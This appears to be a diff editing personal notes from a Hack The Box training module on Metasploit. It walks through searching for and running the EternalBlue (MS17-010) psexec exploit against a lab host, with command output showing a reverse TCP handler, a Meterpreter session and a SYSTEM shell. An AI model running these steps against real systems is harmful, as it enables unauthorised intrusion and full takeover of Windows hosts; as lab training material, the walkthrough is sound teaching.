@@ -2,24 +2,22 @@
 
 Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run `Metasploit`, we can use the `msfconsole` command:
 
-Public Exploits
-
 ```shell-session
 Iskandeur@htb[/htb]$ msfconsole
 
 
-      .:okOOOkdc'           'cdkOOOko:.
+      .:okOOOkdc\'           \'cdkOOOko:.
     .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
    :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
-  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  \'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO\'
   oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
   dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
   lOOOOOOOO.         ;d;         ,OOOOOOOOl
   .OOOOOOOO.   .;           ;    ,OOOOOOOO.
-   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
+   cOOOOOOO.   .OOc.     \'oOO.   ,OOOOOOOc
     oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
      lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
-      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
+      ;OOOO\'   .OOOO.   :OOOO.   ;OOOO;
        .dOOo   .OOOOocccxOOOO.   xOOd.
          ,kOl  .OOOOOOOOOOOOO. .dOk,
            :kk;.OOOOOOOOOOOOO.cOk:
@@ -35,9 +33,7 @@ Iskandeur@htb[/htb]$ msfconsole
 + -- --=[ 7 evasion                                       ]
 ```
 
-Once we have `Metasploit` running, we can search for our target application with the `search exploit` command. For example, we can search for the SMB vulnerability we identified previously:
-
-Public Exploits
+Once we have `Metasploit` running, we can search for our target application with the `search exploit` command. For example, we can search for the [[SMB]] vulnerability `[[EternalBlue]]` / `[[MS17-010]]` we identified previously:
 
 ```shell-session
 msf6 > search exploit eternalblue
@@ -46,17 +42,14 @@ Matching Modules
 ================
 
    #  Name                                           Disclosure Date  Rank     Check  Description
-   -  ----                                           ---------------  ----     -----  -----------
-<SNIP>
+   -  ----                                           ---------------  ----     -----  -----------\n<SNIP>
 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
-   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010
 ```
 
-Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search
+**Tip:** Search can apply complex filters such as `search cve:2009 type:exploit`. See all the filters with `help search`.
 
-We found one exploit for this service. We can use it by copying the full name of it and using `USE` to use it:
-
-Public Exploits
+We found one exploit for this service. We can use it by copying the full name of it (`exploit/windows/smb/ms17_010_psexec`) and using the `USE` command to select it:
 
 ```shell-session
 msf6 > use exploit/windows/smb/ms17_010_psexec
@@ -65,8 +58,6 @@ msf6 > use exploit/windows/smb/ms17_010_psexec
 ```
 
 Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the `show options` command:
-
-Public Exploits
 
 ```shell-session
 Module options (exploit/windows/smb/ms17_010_psexec):
@@ -77,7 +68,7 @@ Module options (exploit/windows/smb/ms17_010_psexec):
    LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
    NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
    NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
-   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax \'file:<path>\'
    RPORT                 445                                                             yes       The Target port (TCP)
    SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
    SERVICE_DISPLAY_NAME                                                                  no        The service display name
@@ -90,9 +81,7 @@ Module options (exploit/windows/smb/ms17_010_psexec):
 ...SNIP...
 ```
 
-Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have two options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). The second option, `LHOST`, represents the IP of our attack host (this can be a single IP, or the name of a network interface. In the example below, `LHOST` is being set to the IP associated with our `tun0` interface.) We can set them with the `set` command:
-
-Public Exploits
+Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have two options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). The second option, `LHOST`, represents the IP of our attack host (this can be a single IP, or the name of a network interface like `tun0`). We can set them with the `set` command:
 
 ```shell-session
 msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
@@ -101,9 +90,7 @@ msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
 LHOST => tun0
 ```
 
-Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:
-
-Public Exploits
+Once we have both options set, we can start the exploitation. However, before we run the script, we can run a `check` to ensure the server is vulnerable:
 
 ```shell-session
 msf6 exploit(windows/smb/ms17_010_psexec) > check
@@ -114,14 +101,12 @@ msf6 exploit(windows/smb/ms17_010_psexec) > check
 [+] 10.10.10.40:445 - The target is vulnerable.
 ```
 
-As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:
-
-Public Exploits
+As we can see, the server is indeed vulnerable. Note that not every exploit in the `[[Metasploit Framework (MSF)]]` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:
 
 ```shell-session
 msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 
-[*] Started reverse TCP handler on 10.10.14.2:4444 
+[*] Started reverse TCP handler on 10.10.14.2:4444
 [*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
 [*] 10.10.10.40:445 - Built a write-what-where primitive...
 [+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
@@ -132,23 +117,23 @@ msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 [*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000
 
 meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
+Server username: NT AUTHORITY\\SYSTEM
 meterpreter > shell
 Process 39640 created.
 Channel 0 created.
 Windows 7 Professional 7601 Service Pack 1
 (C) Copyright 1985-2009 Microsoft Corp.
 
-C:\WINDOWS\system32>whoami
-NT AUTHORITY\SYSTEM
+C:\\WINDOWS\\system32>whoami
+NT AUTHORITY\\SYSTEM
 ```
 
-As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:
+As we can see, we have been able to gain admin access (`[[Privilege Escalation]]` to `NT AUTHORITY\SYSTEM`) to the box and used the `shell` command to drop us into an interactive shell. The payload used was likely a `[[Meterpreter]]` [[Reverse Shells | reverse TCP shell]]. These are basic examples of using `[[Metasploit Framework (MSF)]]` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but are not limited to:
 
-- Granny/Grandpa
-- Jerry
-- Blue
-- Lame
-- Optimum
-- Legacy
-- Devel
+- [[Granny]] / [[Grandpa]]
+- [[Jerry]]
+- [[Blue]]
+- [[Lame]]
+- [[Optimum]]
+- [[Legacy]]
+- [[Devel]]
